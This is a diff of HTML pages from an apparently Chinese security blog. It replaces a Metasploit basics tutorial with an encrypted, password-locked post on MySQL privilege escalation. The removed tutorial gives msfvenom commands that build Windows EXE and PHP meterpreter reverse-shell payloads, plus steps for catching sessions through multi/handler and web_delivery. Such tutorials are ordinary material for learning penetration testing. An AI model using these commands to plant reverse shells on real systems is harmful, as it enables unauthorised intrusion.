@@ -7,7 +7,7 @@
 
 
 
-<title>Metasploit基础知识 | langke Blog</title>
+<title>MYsqll提权 | langke Blog</title>
 
 
 
@@ -104,14 +104,14 @@
         <div id="post-toc" class="post-toc">
             <span class="post-toc-title">catalogue</span>
             <div class="post-toc-content">
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit基础知识"><span class="toc-text">Metasploit基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf炫酷启动"><span class="toc-text">Msf炫酷启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模块"><span class="toc-text">模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基础命令"><span class="toc-text">基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#生成命令"><span class="toc-text">生成命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#演示"><span class="toc-text">演示</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypt-message"><span class="toc-text">不输入密码不可以看幺！.</span></a></li></ol>
             </div>
         </div>
     
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Metasploit基础知识</h1>
+            <h1 class="post-title">MYsqll提权</h1>
             
                 <div class="post-meta">
                     
@@ -120,7 +120,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">September 30, 2018&nbsp;&nbsp;19:17:29</a>
+                        Date: <a href="#">September 27, 2018&nbsp;&nbsp;21:20:29</a>
                         </span>
                     
                     
@@ -129,53 +129,7 @@
         </header>
 
         <section class="post-content">
-            <h1 id="Metasploit基础知识"><a href="#Metasploit基础知识" class="headerlink" title="Metasploit基础知识"></a>Metasploit基础知识</h1><pre><code>Msf是干嘛的就不多说了，我想大家都知道。  
-Msf一般会有四种接口对外提供，msfconsole,msfcli,msfgui,msfweb。
-我们常用的是：msfconsole
-</code></pre><h3 id="Msf炫酷启动"><a href="#Msf炫酷启动" class="headerlink" title="Msf炫酷启动"></a>Msf炫酷启动</h3><blockquote>
-<p><strong>启动界面</strong></p>
-</blockquote>
-<a id="more"></a>
-<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/msf_start.png" alt="msf启动"></p>
-<blockquote>
-<p><strong>查看所有命令</strong></p>
-</blockquote>
-<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/msf_ml.png" alt="msf所有命令"></p>
-<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><ul>
-<li>exploit<br>利用程序，针对漏洞，权限进行利用，是主要使用的模块。</li>
-<li>payload<br>用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取。</li>
-<li>auxiliary<br>该模块包含了扫描、嗅探、指纹识别、网络协议欺骗等相关功能模块。</li>
-<li>encoder<br>主要针对exploit模块进行代码免杀，以逃过杀毒软件，防火墙，ids等安全防护机制的检测。</li>
-</ul>
-<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><ul>
-<li><code>search</code>  <strong>查找</strong></li>
-<li><code>use</code>  <strong>选取、使用模块</strong></li>
-<li><code>info</code>  <strong>查看信息</strong></li>
-<li><code>show</code>  <strong>显示可用信息</strong></li>
-<li><code>set</code>  <strong>给相关对象赋值</strong></li>
-<li><code>exploit\run</code>  <strong>执行</strong></li>
-<li><code>exploit -j</code>  <strong>后台执行</strong></li>
-<li><code>back</code>  <strong>返回上一级</strong></li>
-<li><code>sessions -i</code>  <strong>查看当前可用会话</strong></li>
-<li><code>sessions -K</code>  <strong>杀死所有活跃会话</strong><br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/msf_minglingyanshi.png" alt="use-and-show"></li>
-</ul>
-<h3 id="生成命令"><a href="#生成命令" class="headerlink" title="生成命令"></a>生成命令</h3><p><strong>生成EXE程序</strong><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f exe &gt; shell.exe</code><br><strong>生成PHP</strong><br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port&gt; -f raw &gt; shell.php</code></p>
-<p><a href="https://www.cnblogs.com/backlion/p/6000544.html" target="_blank" rel="noopener">更详细的生成命令》》</a></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>exploit/multi/handler</strong></p>
-<ul>
-<li>1.Msfvenom生成程序</li>
-<li>2.使用handler执行exp</li>
-<li>3.在目标机器运行Msfvenom生成程序</li>
-<li>4.返回session</li>
-</ul>
-<p><strong>exploit/multi/script/wev_delivery</strong></p>
-<ul>
-<li>1.使用web_delivery返回脚本执行并加载exp</li>
-<li>2.在目标机器运行脚本</li>
-<li>3.返回session</li>
-</ul>
-<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Equity/msf_shengchengzhixing.png" alt="返回session"></p>
-
+            <script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">不输入密码不可以看幺！.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19uQgcZSiWkER2DN2PWQEJlPOGUdB4LqQQaPS0OpxgEm77Buz49TNM/KA0kZWx/0ttFnWLCi+9Dqbw1IkizAbNuitgk8MZ1qQFbNx3o+fIhqARsEtGPbnmjS/SKzlLNvchEp/RyD28mRO7wK7yXhour7vz6ymFc+vNfDai0ivVQXOcS1vcC5Lw2y1SFujIhonfnHOQobWYqr57jypi286wGDkgLcDRzL8bLocWn/Zjxe01Lf/1s6R7NZ9zYF6hVWnEeZxWHwdozP4q2cQvJO04JAI3sp2Sz7fLzxYuQH3k8dTV/JZTFLBQf1lOWH33BXME4yK5El4VLs1kio4hWS23Rn/RTPO9Teki0gvJ9TzSzPvEppg3TYhESz3rOLSgrIu5fujK5INRd4i8kT03PCURxR2MbtBcY9rHLDo23b5YebID3Sz0933yWiJqDHwRE1CbijAYWFYzDNstv/c+v/uSzO/JlxOqIRp3xJQJjP6X3TpJVOTMRuAHzXy6pZVgvX9kxCVzedtyGAma6julK5qfQxEb+81SJeWOhtMRFct7CuNyRhXN0hdb1N1cWHJAwaltB910tsq/2pZ8GvfbJKHmZ+0IHlcJWxkbHnMICjYRlWIPBpqB8s1/jBRlx+13S0wMcmmHbIDbK653kGfPO3vrldWIwYRe8JrJnn5xaxkd4CQWGzXNMbj00js0CXrV1CjqrwjBcfXWZr1Me8YzTrJjYJ5ntn6eDEn56vpiNV3h8WeLlqjPTym/UbYbMNUCmAWEvaGwbxtJYKO+jKisEoF7inwjiKIe5CwVL3hLgci0g3Jz7K+n+72HpXJ7Ib89Au8HpuS4v5zNQbUKXTMPuFM4lZqnbYtqBx9+DCwxFce6nNiXTYnTON3Bm4EZ6IbVl4KauJXFUvTX+1TbywZsFgWccRbBwYNoXk0zQFI01dd/MLnCRIsaB+NNnx3RKtJLP/1126XuLKcXpZ0opgTwyGkxqbfht1wnDDTPvkBPTGX0GAnGy4KozcN9fZ18iLikc15jCdpI9Qkcy2Jz6XK2zK7AvfB3wDT8qPjRLeV4TW8WjSzxZugm4KJESAGJCxf1w2+W5WPChfeDAyySZ6aZBccw2lUkL/v2zETaB0j/WKjrriK+/cMFRvO2HZ41D7yGG+dbWzXG94NhNRtBbtSSEdiIOASuoiN2G7FFF86p+syzA2vY2SLE5ANrUGJhWqFkEsjLscNbrQXMgzW+hZj2FoWdhSdhSC8G6N3cymCTe1z5Bg+XQLyUbx43lm9ISP1P590niRPST+MgtTrjs59xoort2spxE+eVCt0GaWFCIvqVuFj7RdtDjpiBLRy8EqhBHHNlR+IX2Cw2oIVueimHM5SFmDVVITiNXk4R6lulCOg/QR5j/0eFtIM/CJ80DuhbtRw9s85fTbaSAagA9Kak90kH/ZlCHnLUrb+pXz+xzHwv4wiRe0dSCJ5owZXb2VT7dSAGpm4n4ixX5Q2XxLT7NxhCGqGLsdd6sWW4iDXOsk9RTOuEvsHlivyMxxQC2r3Tt0WOgBx9kR1VkgO5rnl2Ecs3QzEUasYlpA8dSnHks8x9YQ3yOgKxqSzHyg3pgLkexJKRhDkx7V/da45PXdvmVylb2LsFHaVWvWexCnmMB/vjeSg+JYdESK9IMN3FhIv503mjUwYHXkvve8q8Z2vM1zf6i1lUdsUH4lZJGBS+mHT24+40B+6Kk1oQJT1bS4zQbGUWBu80oXoqLPwQRb/VGUsakH7rr7MbYQUBcTjgvVhZsMOi8o5HCYA6N3uxSdfS94OtY9KwywfL1moUpHHoAjIskPpojZv6I74E= </div>
         </section>
 
         
@@ -189,7 +143,7 @@ Msf一般会有四种接口对外提供，msfconsole,msfcli,msfgui,msfweb。
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2018/09/30/Metasploit基础知识/">http://yoursite.com/2018/09/30/Metasploit基础知识/</a></span>
+                        <span><a href="http://yoursite.com/2018/09/27/MYsqll提权/">http://yoursite.com/2018/09/27/MYsqll提权/</a></span>
                     </p>
                 
                 
@@ -226,10 +180,10 @@ Msf一般会有四种接口对外提供，msfconsole,msfcli,msfgui,msfweb。
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2018/10/06/内网信息收集/">内网信息收集</a>
+                <a class="prev" rel="prev" href="/2018/09/30/Metasploit基础知识/">Metasploit基础知识</a>
             
             
-            <a class="next" rel="next" href="/2018/09/27/MYsqll提权/">MYsqll提权</a>
+            <a class="next" rel="next" href="/2018/09/26/MS-SQL提权/">MS-SQL提权</a>
             
         </section>
 
